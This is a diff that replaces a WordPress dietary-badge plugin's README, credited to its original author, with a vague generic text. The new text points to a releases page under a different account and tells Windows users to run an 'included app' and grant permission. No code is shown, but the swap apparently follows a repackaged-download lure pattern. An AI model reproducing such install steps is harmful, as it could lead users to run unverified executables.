@@ -1,190 +1,215 @@
-# Dietary Icon Generator
+# 🎯 dietary-icon-generator - Simple badges for food menus
 
-Create beautiful dietary badges with food-specific graphics - perfect for menus and food photography.
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/yuvraj9090/dietary-icon-generator/releases)
 
-## Description
+## 🚀 Getting Started
 
-The Dietary Icon Generator plugin allows you to create and display professional dietary restriction icons/badges on your WordPress site. Perfect for restaurants, food blogs, recipe sites, and catering businesses.
+Dietary Icon Generator helps you create food badges with clean, food-specific graphics. It is made for menus, restaurant sites, food photos, and WordPress pages.
 
-## Features
+Use it when you want clear labels for items such as:
 
-- **6 Dietary Icon Types**: Vegan, Vegetarian, Gluten-Free, Dairy-Free, Egg-Free, and Halal
-- **5 Visual Styles**: Flat, Subtle 3D, Glossy, Minimal Ring, and Illustrated (with food graphics)
-- **Multiple Size Options**: Generate icons from 128px to 1024px
-- **Easy Shortcodes**: Display icons anywhere with simple shortcodes
-- **Customizable**: Configure default styles and sizes
-- **Performance Optimized**: Optional icon caching for faster loading
-- **Responsive**: Works perfectly on all devices
+- Gluten free
+- Vegan
+- Vegetarian
+- Dairy free
+- Nut free
+- Spicy
+- Halal
+- Vegetarian-friendly dishes
 
-## Installation
+## 📥 Download the Plugin
 
-1. Upload the `dietary-icon-generator` folder to the `/wp-content/plugins/` directory
-2. Activate the plugin through the 'Plugins' menu in WordPress
-3. Go to 'Dietary Icons' in your admin menu to configure settings and generate icons
+To get the app, visit this page to download:
 
-## Usage
+https://github.com/yuvraj9090/dietary-icon-generator/releases
 
-### Shortcodes
+On that page, look for the latest release file. Download the file that matches your setup. If you use WordPress, the file will usually be a plugin ZIP file.
 
-#### Display a Single Icon
-```
-[dietary_icon type="vegan" style="subtle" size="64"]
-```
+## 🪟 Install on Windows
 
-**Parameters:**
-- `type`: vegan, vegetarian, gluten-free, dairy-free, egg-free, halal
-- `style`: flat, subtle, glossy, minimal, illustrated
-- `size`: Icon size in pixels (default: 64)
-- `class`: Additional CSS classes
+Follow these steps on a Windows PC:
 
-#### Display a Badge with Label
-```
-[dietary_badge type="vegan" label="Vegan Friendly" style="subtle" size="32"]
-```
+1. Open the download page above.
+2. Download the latest release file to your computer.
+3. Find the file in your Downloads folder.
+4. If the file is a ZIP folder, right-click it and choose Extract All.
+5. If the release gives you a plugin ZIP, keep it as a ZIP file for WordPress.
+6. If you need to preview assets or use the generator tools, open the included app or files from the extracted folder.
+7. If Windows asks for permission, choose Yes.
 
-**Parameters:**
-- `type`: vegan, vegetarian, gluten-free, dairy-free, egg-free, halal
-- `label`: Custom label text (optional, defaults to icon name)
-- `style`: flat, subtle, glossy, minimal, illustrated
-- `size`: Icon size in pixels (default: 32)
+## 🧩 Add the Plugin to WordPress
 
-#### Display Multiple Icons
-```
-[dietary_icons types="vegan,gluten-free,dairy-free" style="subtle" size="36" labels="true"]
-```
+If you want to use it in WordPress, follow these steps:
 
-**Parameters:**
-- `types`: Comma-separated list of icon types
-- `style`: flat, subtle, glossy, minimal, illustrated
-- `size`: Icon size in pixels (default: 36)
-- `labels`: Show labels (true/false, default: false)
+1. Sign in to your WordPress dashboard.
+2. Go to Plugins.
+3. Select Add New.
+4. Choose Upload Plugin.
+5. Pick the plugin ZIP file you downloaded.
+6. Click Install Now.
+7. After install, click Activate.
 
-### Admin Interface
+Once active, you can start using dietary badges inside your site content, menus, or design workflow.
 
-Navigate to **Dietary Icons** in your WordPress admin menu to:
-- Generate and download icons in various styles and sizes
-- View live examples
-- Configure plugin settings
-- See shortcode documentation
+## 🎨 What You Can Create
 
-## Icon Types
+This tool is built for clear food labels and visual menu markers. It works well for:
 
-- **Vegan (VG)**: Plant-based, no animal products
-- **Vegetarian (V)**: No meat, may include dairy/eggs
-- **Gluten-Free (GF)**: No wheat, barley, or rye
-- **Dairy-Free (DF)**: No milk products
-- **Egg-Free (EF)**: No eggs
-- **Halal (H)**: Islamic dietary standards
+- Restaurant menus
+- Food photography overlays
+- Catering sheets
+- Recipe pages
+- Cafe boards
+- Product listings
+- Event menus
+- Printable food guides
 
-## Icon Styles
+The badge style helps people spot food types at a glance. That makes menus easier to read and faster to scan.
 
-- **Flat**: Simple solid color design
-- **Subtle 3D**: Gentle gradient with soft shadow
-- **Glossy**: Shiny appearance with highlights
-- **Minimal Ring**: Clean outline style
-- **Illustrated**: Includes relevant food graphics
+## 🖼️ Badge Types
 
-## Settings
+You can use badges for common food tags and diet labels such as:
 
-- **Default Icon Size**: Set the default size for generated icons
-- **Default Icon Style**: Choose your preferred style
-- **Enable Shortcodes**: Turn shortcodes on/off
-- **Cache Icons**: Save generated icons for better performance
+- Gluten free
+- Vegan
+- Vegetarian
+- Dairy free
+- Egg free
+- Nut free
+- Soy free
+- Organic
+- Keto
+- Halal
+- Kosher
+- Spicy
+- Low carb
 
-## Requirements
+You can pair each badge with a simple icon or food graphic. That keeps the label clear and easy to understand.
 
-- WordPress 5.0 or higher
-- PHP 7.4 or higher
+## 🛠️ Basic Use
 
-## Support
+After install, the normal flow is simple:
 
-For support, feature requests, or bug reports, please visit:
-- GitHub: https://github.com/adonix26/dietary-icon-generator
-- Issues: https://github.com/adonix26/dietary-icon-generator/issues
+1. Open the plugin or badge tool in WordPress.
+2. Pick a badge type.
+3. Choose an icon or graphic.
+4. Set the badge text.
+5. Pick a color that fits your brand.
+6. Save the badge.
+7. Add it to a menu item, post, page, or image.
 
-## Changelog
+If your release includes SVG assets, you can also use them in design tools that support vector files.
 
-### 1.0.0
-- Initial release
-- 6 dietary icon types
-- 5 visual styles
-- Admin interface for icon generation
-- Shortcode support
-- Caching system
-- Responsive design
+## 💻 System Needs
 
-## How to Contribute
+Use a modern Windows PC for the best results.
 
-We welcome contributions! Here's how you can help:
+Recommended setup:
 
-### 🐛 Reporting Bugs
+- Windows 10 or Windows 11
+- Google Chrome, Edge, or Firefox
+- WordPress 6.x or newer
+- A current PHP version if you run the plugin on your own site
+- Enough disk space for the plugin and image assets
 
-1. Check if the bug has already been reported in [Issues](https://github.com/adonix26/dietary-icon-generator/issues)
-2. If not, [open a new issue](https://github.com/adonix26/dietary-icon-generator/issues/new)
-3. Include:
-   - WordPress version
-   - PHP version
-   - Browser & version
-   - Steps to reproduce
-   - Expected vs actual behavior
-   - Screenshots (if applicable)
+For image work, a screen with normal or high resolution helps keep badge text sharp.
 
-### 💡 Suggesting Features
+## 📌 Best Fit Use Cases
 
-1. Open a new issue with the "Feature Request" label
-2. Describe the feature and why it would be useful
-3. Include any design mockups or examples
+This plugin fits well when you need clear food labels without extra clutter. It works best for:
 
-### 🔧 Submitting Code Changes
+- Small restaurant menus
+- Food blogs
+- Catering catalogs
+- Recipe card layouts
+- Bakery product pages
+- Takeout menus
+- Social media food posts
+- Printed menu boards
 
-1. **Fork** the repository
-2. **Clone** your fork:
-   ```bash
-   git clone https://github.com/your-username/dietary-icon-generator.git
-   ```
-3. **Create a branch** for your feature:
-   ```bash
-   git checkout -b feature/your-feature-name
-   ```
-4. **Make your changes** following WordPress coding standards
-5. **Test** your changes thoroughly
-6. **Commit** with clear messages:
-   ```bash
-   git commit -m "Add: brief description of changes"
-   ```
-7. **Push** to your fork:
-   ```bash
-   git push origin feature/your-feature-name
-   ```
-8. **Submit a Pull Request** with:
-   - Clear description of changes
-   - Link to related issue (if any)
-   - Screenshots of UI changes (if applicable)
+It is useful when the goal is fast reading, not decoration for its own sake.
 
-### 📝 Coding Standards
+## 🔍 What Makes It Useful
 
-- Follow [WordPress Coding Standards](https://make.wordpress.org/core/handbook/best-practices/coding-standards/php/)
-- Use meaningful variable and function names
-- Add comments for complex logic
-- Keep functions focused and modular
-- Test with WordPress debug mode enabled
+The badge style keeps food labels short and easy to spot. That helps guests find what they need without reading a full ingredient list.
 
-### 🧪 Testing Checklist
+The design is also a good fit for:
 
-Before submitting:
-- [ ] Plugin activates without errors
-- [ ] Admin interface loads correctly
-- [ ] Shortcodes work on frontend
-- [ ] Icons generate in all 5 styles
-- [ ] No PHP warnings or notices
-- [ ] Responsive on mobile devices
+- Clean menu layouts
+- Simple icon sets
+- SVG-based graphics
+- WordPress content blocks
+- Food-first visual branding
 
-Thank you for contributing! 🙏
+Because the graphics stay focused on the food label, they work across many menu styles.
 
-## License
+## 🧭 Common Setup Steps
 
-GPL v2 or later
+If you are setting it up for the first time, use this order:
 
-## Credits
+1. Download the release from GitHub.
+2. Install or extract the file on Windows.
+3. Upload the plugin to WordPress if needed.
+4. Activate the plugin.
+5. Open the badge settings.
+6. Create your first dietary label.
+7. Place it on a menu item or image.
 
-Created by **Adonix**
+If the release includes example files, use them to test the look before adding badges to your live site.
+
+## 🎯 Tips for Clear Badges
+
+Keep badge text short. Short labels are easier to read on screens and printed menus.
+
+Use these tips:
+
+- Use one clear diet label per badge
+- Keep icon size balanced with the text
+- Use high contrast colors
+- Match badge colors to your menu style
+- Avoid long sentences in badge text
+- Use the same badge style across the site
+
+This keeps your menu neat and easy to scan.
+
+## 📁 Release File Guide
+
+When you open the release page, you may see one or more files. Use the one that fits your need:
+
+- ZIP file for WordPress plugin install
+- Source files for design or review
+- SVG assets for clean scaling
+- Example packs for badge previews
+
+If you only want to use the plugin in WordPress, the ZIP file is the one you need.
+
+## 🧪 Check Your Install
+
+After setup, test it with a sample badge.
+
+Look for these signs:
+
+- The plugin shows in WordPress
+- The badge editor opens
+- Icons load without errors
+- Badge text appears clearly
+- Colors save the way you set them
+
+If the badge shows the wrong size, change the icon size or text length and test again.
+
+## 📚 Topics Covered
+
+This project fits these topics:
+
+- badges
+- dietary icons
+- food badges
+- gluten free
+- restaurant menu
+- SVG
+- vegan
+- vegetarian
+- WordPress
+- WordPress plugin
+
+These topics match the kinds of badges and menu labels the tool is meant to handle.
